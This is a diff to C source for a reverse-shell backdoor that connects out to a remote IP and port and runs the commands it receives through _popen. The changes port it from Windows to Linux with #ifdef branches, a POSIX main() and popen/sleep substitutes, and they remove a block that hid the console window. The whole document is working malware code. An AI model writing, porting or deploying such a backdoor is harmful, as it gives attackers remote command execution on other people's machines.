@@ -1,10 +1,18 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
+#ifdef _WIN32
 #include <winsock2.h>
 #include <winuser.h>
 #include <wininet.h>
 #include <windowsx.h>
+#else
+#define _popen(...) popen(__VA_ARGS__)
+#include <arpa/inet.h>
+#include <sys/socket.h>
+#include <unistd.h>
+#define Sleep sleep
+#endif
 #include <string.h>
 #include <sys/stat.h>
 #include <sys/types.h>
@@ -13,7 +21,7 @@ static int sock;
 
 static void shell()
 {
-	while (TRUE)
+	while (1)
 	{
 		char buffer[1024];
 		memset(buffer, 0, sizeof(buffer));
@@ -37,7 +45,14 @@ static void shell()
 	}
 }
 
+#ifdef _WIN32
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
+#else
+#define __argc argc
+#define __argv argv
+
+int main(int argc, char* argv[])
+#endif
 {
 	if (__argc != 3)
 	{
@@ -50,21 +65,17 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 	if ((remotePort < 0) || (remotePort > 65535))
 	{
 		fprintf(stderr, "Invalid port value \"%s\" must be in range 0..65535\n",
-			remotePort);
+			__argv[2]);
 		exit(-1);
 	}
-
-	AllocConsole();
-	HWND stealth = FindWindowA("ConsoleWindowClass", NULL);
-	ShowWindow(stealth, 0);
-	
+#ifdef _WIN32
 	WSADATA wsaData;
 	if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
 	{
 		fprintf(stderr, "Error initializing WSA\n");
 		exit(-1);
 	}
-
+#endif
 	sock = socket(AF_INET, SOCK_STREAM, 0);
 	struct sockaddr_in sockAddr;
 	memset(&sockAddr, 0, sizeof(remoteIP));
@@ -82,8 +93,12 @@ start :
 
 	shell();
 
+#ifdef _WIN32
 	closesocket(sock);
 	WSACleanup();
+#else
+	close(sock);
+#endif
 	return 0;
 }
 
